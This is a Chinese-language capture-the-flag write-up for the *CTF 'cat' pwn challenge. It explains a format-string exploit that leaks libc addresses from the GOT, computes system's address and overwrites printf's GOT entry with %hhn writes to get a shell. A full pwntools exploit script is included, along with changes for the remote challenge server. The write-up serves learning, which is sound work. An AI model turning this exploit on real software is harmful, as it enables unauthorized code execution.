---
title: writeup.starctf.pwn.cat
date: 2019-07-22 17:17:42
categories: writeup
tags: [writeup, pwn]
---

日前入门pwn，粗浅学习了写shellcode，rop，栈溢出攻击，现在遇到了fmtstr，把我头搞炸了，决定好好学习一下，写一篇文章作为记录，供日后参考
<!-- more -->

### 样本
题目：https://ctf.sixstars.team/challenges#cat
文件下载：[下载](https://ctf.sixstars.team/files/9f9bdd29cf592733719a1620ba51e0d7/main)
参考资料：[Hint](https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/)
Remote：`$ nc pwn.sixstars.team 22015`
### 分析
![](https://i.loli.net/2019/07/22/5d357efb453ee78822.png)
大概就是这样，程序里没有现成的 `shell` 可拿，所以想法是替换 `printf` 的 `GOT` 值为 `system` 的，然后输入 `/bin/sh` 完事，不知道这是不是叫做 `ret2libc`。
### 解题
首先要获得 `scanf` 写入的缓冲区的地址，或者说是在调用 `printf` 时栈上的偏移量。我使用 `Python 2.7` 与 `pwntools`。
这里是 `printf` 的 `plt` 段
![](https://i.loli.net/2019/07/22/5d357efbba71515728.png)
`printf` 的 GOT 偏移是不会变的，记录下来
```python
from pwn import *    
import struct 

GOT_PLT_ADDR = 0x601030 # printf
```
`scanf` 写入的缓冲区大小是1000，由于是64位题目，如果把地址放在前面会导致直接 `null byte` 截断，无法获得输出，所以把地址放在最后
```python
def pad(s):
    return s + "X"*(1000 - len(s) - 8)
```
先写一个获取偏移量的 `payload`。

```python
def calc_offset_payload():
    pl = ""
    pl += "AAAAAAAA" 
    pl += "|%p|" * 150
    pl = pad(pl)
    pl += struct.pack("Q", GOT_PLT_ADDR) 
    return pl
```

执行

```python
proc = process("./catstory")
proc.sendline(calc_offset_payload()) 
print proc.recv()
```
![](https://i.loli.net/2019/07/22/5d357efc82ea588974.png)
可以数出来
![](https://i.loli.net/2019/07/22/5d357efd1778140442.png)
在第132个“参数”处，因此后面通过 `%n` 写入数值的时候，往132个偏移，即 `%132$n` 写入即可。
看看它采用的安全手段
![](https://i.loli.net/2019/07/22/5d357efd75d0258321.png)
 在这里做一个小笔记，`PIE` 是将主程序加载进随机的（但不是任意位置，需要对齐等）地址空间，可以用来防范 rop，而 `ASLR` 则是操作系统级别的一个东西，随机化动态链接库的地址，而动态链接库一定是PIE的。可以理解为如果程序开启了 PIE，那么上面的 `0x601030` 是不能直接用的，因为主程序像动态链接库一样，地址被随机化了。
 这题没开启PIE，那么可以少操一点心。
 首先，目标是把 `printf` 的 GOT 改为 `system` 的，但是我们对 remote 的 libc 一无所知，需要先泄露一些地址。
 我们选择 `printf` 和 `__libc_start_main` 的地址进行泄露，我的思路是按位打印，这样如果遇到 0x00 也可以知道。
 

```python
def get_got_addr_payload(i):
    pl = ""
    pl += "AAAAAAAA" 
    pl += "%132$s"
    pl = pad(pl)
    pl += struct.pack("Q", GOT_PLT_ADDR + i) 
    return pl
    
def get_got_addr(proc):
    got_addr = list("")
    for i in range(0, 8): 
        pld = get_got_addr_payload(i)
        proc.sendline(pld)
        rec = proc.recv() 
        #print rec
        #print len(rec)
        if len(rec) == 991:
            got_addr += '\0'
        else :
            got_addr += rec[8]
    got_addr = "".join(got_addr) 
    got_addr = struct.unpack("P", got_addr)
    return got_addr
```
执行

```python
proc = process("./catstory")
GOT_PLT_ADDR = 0x601030 # printf
printf_addr = get_got_addr(proc)
printf_addr = int(''.join(map(str,printf_addr)))
print "printf_addr = %x" % (printf_addr)
```
![](https://i.loli.net/2019/07/22/5d357efdbcab174130.png)
这是不够的，还需要知道 `__libc_start_main` 的地址，由于 `ASLR` ，需要在一次运行时内写出。

```python
GOT_PLT_ADDR = 0x601038 # __libc_start_main
libc_start_main_addr = get_got_addr(proc)
libc_start_main_addr = int(''.join(map(str,libc_start_main_addr)))
print "libc_start_main_addr = %x" % (libc_start_main_addr)
```
![](https://i.loli.net/2019/07/22/5d357efe2515379346.png)
我们知道了两个偏移，就可以知道 `libc` 的信息了。使用 [libc-database](https://github.com/niklasb/libc-database)。

![](https://i.loli.net/2019/07/22/5d357efe6c20665562.png)
由此我们可以获得 libc，再得出 `system` 的地址
![](https://i.loli.net/2019/07/22/5d357efeb0bdc25325.png)
因此，`system_addr = printf_addr + offset_system - offset_printf`

```python
system_addr = printf_addr + 0x4f440 - 0x64e80
print "system_addr = %x" % (system_addr)
```
![](https://i.loli.net/2019/07/22/5d357eff00d9922963.png)
最后我们只需把 `system` 的地址写入到 `printf` 里去，即可完成攻击。不过我有一个小问题就是 scanf 是不接受 `0x20` 即空格的，如果遇到了我不知道怎么办。
可见，我们需要修改低三个字节的内容。这里我推荐使用 `%hhn`，一个字节一个字节写入。于是我们需要修改 `pad` 函数，使后面能容纳三个地址

```python
def pad2(s):
    return s + "X"*(1000 - len(s) - 24)
```
容易知道三个地址的偏移变成了 130， 131， 132。
```python
def set_got_addr_payload(v1, v2, v3, a1, a2, a3):
    pl = "" 
    pl += "%{}x".format(v1)
    pl += "%130$hhn"
    pl += "%{}x".format(v2)
    pl += "%131$hhn"
    pl += "%{}x".format(v3)
    pl += "%132$hhn"
    pl = pad2(pl)
    pl += struct.pack("Q", a1) 
    pl += struct.pack("Q", a2) 
    pl += struct.pack("Q", a3)
    return pl
```
由于写入需要一定的顺序，而且只能递增，因此需要一些小的计算，我不细说了，自己体会。

```python
def sort_get_idx(vals):
    return sorted(range(len(vals)), key=lambda k: vals[k])
```
别忘了 
```python
import numpy as np
```

```python
val1 = int(np.uint8(system_addr))
print "%x" % (val1)
val2 = int(np.uint8(system_addr >> 8))
print "%x" % (val2)
val3 = int(np.uint8(system_addr >> 16))
print "%x" % (val3)

sorted_idx = sort_get_idx([val1, val2, val3])
print sorted_idx
sorted_val = sorted([val1, val2, val3])
print sorted_val

pld = set_got_addr_payload(sorted_val[0], sorted_val[1] - sorted_val[0], sorted_val[2] - sorted_val[1], \
    GOT_PLT_ADDR + sorted_idx[0], GOT_PLT_ADDR + sorted_idx[1], GOT_PLT_ADDR + sorted_idx[2])
```
最后

```python
proc.sendline(pld)
proc.recvrepeat(1)
proc.sendline("/bin/sh")
proc.interactive()
```
![](https://i.loli.net/2019/07/22/5d357f0436da259976.png)
如果遇到了 `EOFError` ，重新执行脚本应该可以解决问题。
完整本地脚本：

```python
from pwn import *    
import struct
import numpy as np

GOT_PLT_ADDR = 0x601030 # printf

def pad(s):
    return s + "X"*(1000 - len(s) - 8)

def pad2(s):
    return s + "X"*(1000 - len(s) - 24)

def calc_offset_payload():
    pl = ""
    pl += "AAAAAAAA" 
    pl += "|%p|" * 150
    pl = pad(pl)
    pl += struct.pack("Q", GOT_PLT_ADDR) 
    return pl

def get_got_addr_payload(i):
    pl = ""
    pl += "AAAAAAAA" 
    pl += "%132$s"
    pl = pad(pl)
    pl += struct.pack("Q", GOT_PLT_ADDR + i) 
    return pl

def get_got_addr(proc):
    got_addr = list("")
    for i in range(0, 8): 
        pld = get_got_addr_payload(i)
        proc.sendline(pld)
        rec = proc.recv() 
        #print rec
        #print len(rec)
        if len(rec) == 991:
            got_addr += '\0'
        else :
            got_addr += rec[8]
    got_addr = "".join(got_addr) 
    got_addr = struct.unpack("P", got_addr)
    return got_addr

def set_got_addr_payload(v1, v2, v3, a1, a2, a3):
    pl = "" 
    pl += "%{}x".format(v1)
    pl += "%130$hhn"
    pl += "%{}x".format(v2)
    pl += "%131$hhn"
    pl += "%{}x".format(v3)
    pl += "%132$hhn"
    pl = pad2(pl)
    pl += struct.pack("Q", a1) 
    pl += struct.pack("Q", a2) 
    pl += struct.pack("Q", a3)
    return pl
    
def sort_get_idx(vals):
    return sorted(range(len(vals)), key=lambda k: vals[k])

#proc.sendline(calc_offset_payload()) 
#print proc.recv()

proc = process("./catstory")
GOT_PLT_ADDR = 0x601030 # printf
printf_addr = get_got_addr(proc)
printf_addr = int(''.join(map(str,printf_addr)))
print "printf_addr = %x" % (printf_addr)

GOT_PLT_ADDR = 0x601038 # __libc_start_main
libc_start_main_addr = get_got_addr(proc)
libc_start_main_addr = int(''.join(map(str,libc_start_main_addr)))
print "libc_start_main_addr = %x" % (libc_start_main_addr)

system_addr = printf_addr + 0x4f440 - 0x64e80
print "system_addr = %x" % (system_addr)

val1 = int(np.uint8(system_addr))
print "%x" % (val1)
val2 = int(np.uint8(system_addr >> 8))
print "%x" % (val2)
val3 = int(np.uint8(system_addr >> 16))
print "%x" % (val3)

sorted_idx = sort_get_idx([val1, val2, val3])
print sorted_idx
sorted_val = sorted([val1, val2, val3])
print sorted_val

GOT_PLT_ADDR = 0x601030 # printf

proc.sendline(set_got_addr_payload(sorted_val[0], sorted_val[1] - sorted_val[0], sorted_val[2] - sorted_val[1], \
    GOT_PLT_ADDR + sorted_idx[0], GOT_PLT_ADDR + sorted_idx[1], GOT_PLT_ADDR + sorted_idx[2]))
proc.recvrepeat(1)
  
proc.sendline("/bin/sh")
proc.interactive()  
```
最后我们只要稍作修改即可用于远程服务器，获取	`flag`
首先由于不知道的原因，原本一次 `proc.recv()` 现在需要调用两次才能读完缓冲区。如果打印 `0x00`，原本 991 的长度被分为 989 和 2。

```python
def get_got_addr(proc):
    got_addr = list("")
    for i in range(0, 8): 
        pld = get_got_addr_payload(i)
        proc.sendline(pld)
        rec = proc.recv()
        proc.recv() 
        #print rec
        #print len(rec)
        if len(rec) == 989:
            got_addr += '\0'
        else :
            got_addr += rec[8]
    got_addr = "".join(got_addr) 
    got_addr = struct.unpack("P", got_addr)
    return got_addr
```
最后最重要的就是远程的libc和本地是不一样的，需要自己重新进行计算。
`proc = remote("pwn.sixstars.team", 22015) `
稍作修改后，执行
![](https://i.loli.net/2019/07/22/5d357f04957c272447.png)
`flag` 是 `*ctf{----------------------------------}` ，拒绝当 Script Kiddle，自己研究才有乐趣。
![](https://i.loli.net/2019/07/22/5d357f0529cf592631.png)
